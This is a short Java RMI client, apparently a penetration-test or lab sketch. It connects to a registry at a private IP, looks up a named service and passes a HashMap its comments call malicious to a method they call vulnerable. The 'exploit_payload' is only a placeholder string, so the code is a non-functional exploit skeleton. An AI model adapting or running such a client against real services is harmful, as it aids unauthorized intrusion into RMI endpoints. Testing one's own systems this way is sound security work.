import interfaces.ExampleRMIInterface;

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;

public class RMITestClient {
    public static void main(String[] args) {
        try {
            // Connect to the RMI registry on the target server
            Registry registry = LocateRegistry.getRegistry("192.168.20.21", 1099);

            // Look up the RMI object
            ExampleRMIInterface rmiObject = (ExampleRMIInterface) registry.lookup("UserRequestService");

            // Craft malicious HashMap object
            HashMap<String, String> maliciousHashMap = new HashMap<>();
            maliciousHashMap.put("key", "exploit_payload");

            // Call the vulnerable method with the malicious object as a parameter
            String result = rmiObject.someOtherRemoteMethod("parameter", maliciousHashMap);

            // Handle response
            System.out.println("Result: " + result);
        } catch (Exception e) {
            System.err.println("Client exception: " + e.toString());
            e.printStackTrace();
        }
    }
}
